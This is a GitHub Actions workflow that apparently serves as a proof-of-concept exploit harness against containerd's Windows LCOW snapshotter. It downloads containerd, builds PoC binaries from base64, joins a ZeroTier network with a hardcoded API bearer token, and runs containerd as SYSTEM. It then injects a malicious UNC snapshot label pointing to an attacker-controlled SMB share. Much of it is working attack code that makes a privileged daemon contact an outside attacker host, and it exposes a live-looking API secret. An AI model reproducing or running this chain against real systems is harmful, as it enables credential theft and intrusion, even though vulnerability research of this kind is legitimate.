name: D17 ZT victim LCOW UNC trigger
on:
  workflow_dispatch:

jobs:
  victim:
    runs-on: windows-latest
    timeout-minutes: 20
    steps:
      - name: Setup containerd + harness + stub
        shell: pwsh
        run: |
          $ErrorActionPreference='Stop'
          $base='C:\ctdpoc'
          New-Item -ItemType Directory -Force -Path "$base\bin","$base\root","$base\state","$base\canary","$base\go","$base\stub","$base\share" | Out-Null
          Invoke-WebRequest -Uri 'https://github.com/containerd/containerd/releases/download/v2.4.2/containerd-2.4.2-windows-amd64.tar.gz' -OutFile "$base\ctd.tar.gz" -UseBasicParsing
          tar xzf "$base\ctd.tar.gz" -C "$base\bin"
          $cfg=''; [IO.File]::WriteAllBytes("$base\config.toml",[Convert]::FromBase64String($cfg))
          $gm='bW9kdWxlIGQxN3BvYwoKZ28gMS4yNAoKcmVxdWlyZSBnaXRodWIuY29tL2NvbnRhaW5lcmQvY29udGFpbmVyZC92MiB2Mi40LjIK'; [IO.File]::WriteAllBytes("$base\go\go.mod",[Convert]::FromBase64String($gm))
          $mn=''; [IO.File]::WriteAllBytes("$base\go\main.go",[Convert]::FromBase64String($mn))
          $st=''; [IO.File]::WriteAllBytes("$base\stub\main.go",[Convert]::FromBase64String($st))
          Set-Content "$base\stub\go.mod" -Value "module stub`n`ngo 1.24" -Encoding ascii
          $env:GO111MODULE='on'
          Set-Location "$base\go"; go mod tidy 2>&1 | Out-Null; go build -o "$base\poc.exe" . 2>&1 | Out-Null
          Set-Location "$base\stub"; go build -o "$base\bin\bin\runhcs.exe" . 2>&1 | Out-Null
          Write-Output 'SETUP_OK'

      - name: Join ZT + start containerd(SYSTEM) + trigger at attacker ZT IP
        shell: pwsh
        run: |
          $ErrorActionPreference='Continue'
          $base='C:\ctdpoc'; $tok='qhvzxqETSjDAbYmUxEQUayNXIzULfVBf'; $net='363c67c55a7dcb11'
          winget install --id ZeroTier.ZeroTierOne -e --accept-source-agreements --accept-package-agreements --silent 2>&1 | Select-Object -Last 3
          Start-Sleep -Seconds 5
          $ztcli='C:\Program Files (x86)\ZeroTier\One\zerotier-cli.bat'
          if (-not (Test-Path $ztcli)) { $ztcli='C:\Program Files\ZeroTier\One\zerotier-cli.bat' }
          & $ztcli join $net 2>&1
          $nodeid = (& $ztcli info 2>&1 | Select-String -Pattern '\b([0-9a-f]{10})\b' | ForEach-Object { $_.Matches[0].Value } | Select-Object -First 1)
          Write-Output "VICTIM_NODEID=$nodeid"
          $h=@{ Authorization="Bearer $tok"; 'Content-Type'='application/json' }
          Invoke-WebRequest -Uri "https://api.zerotier.com/api/v1/network/$net/member/$nodeid" -Method Post -Headers $h -Body '{"config":{"authorized":true},"name":"d17-victim"}' -UseBasicParsing -TimeoutSec 20 | Out-Null
          Start-Sleep -Seconds 15
          # find attacker IP from ZT API
          $attackerIp=''
          $members=Invoke-RestMethod -Uri "https://api.zerotier.com/api/v1/network/$net/member" -Headers $h -TimeoutSec 20
          foreach ($m in $members) {
            if ($m.name -eq 'd17-attacker' -and $m.config.ipAssignments.Count -gt 0) { $attackerIp=$m.config.ipAssignments[0] }
          }
          Write-Output "ATTACKER_ZTIP=$attackerIp"
          if (-not $attackerIp) { Write-Output 'NO_ATTACKER_IP'; exit 1 }
          $unc = "\\$attackerIp\SHARE"
          Write-Output "=== malicious UNC label: $unc ==="
          $act=New-ScheduledTaskAction -Execute 'cmd.exe' -Argument "/c `"$base\bin\bin\containerd.exe --config $base\config.toml --log-level debug > $base\stdout.log 2> $base\stderr.log`""
          $prin=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
          $task=New-ScheduledTask -Action $act -Principal $prin
          Register-ScheduledTask -TaskName 'ctdpoc-daemon' -InputObject $task -Force | Out-Null
          Start-ScheduledTask -TaskName 'ctdpoc-daemon'
          Start-Sleep -Seconds 10
          Get-Process containerd -ErrorAction SilentlyContinue | Select-Object Id,ProcessName | Format-Table
          & "$base\bin\bin\ctr.exe" --address '\\.\pipe\ctd-grpc' plugins ls 2>&1 | Select-String 'windows-lcow'
          & "$base\poc.exe" '\\.\pipe\ctd-grpc' 'd17poc' 'windows-lcow' 'victim-zt' 'containerd.io/snapshot/io.microsoft.container.storage.rootfs.location' $unc 2>&1 | Tee-Object -FilePath "$base\prepare_zt.out"
          Write-Output "POC_EXIT=$LASTEXITCODE"
          Start-Sleep -Seconds 5
          Write-Output '=== daemon tail ==='
          if (Test-Path "$base\stderr.log") { Get-Content "$base\stderr.log" -Tail 12 }

      - name: Upload evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: zt-victim-evidence
          path: |
            C:\ctdpoc\prepare_zt.out
            C:\ctdpoc\stderr.log
            C:\ctdpoc\stdout.log
          if-no-files-found: warn
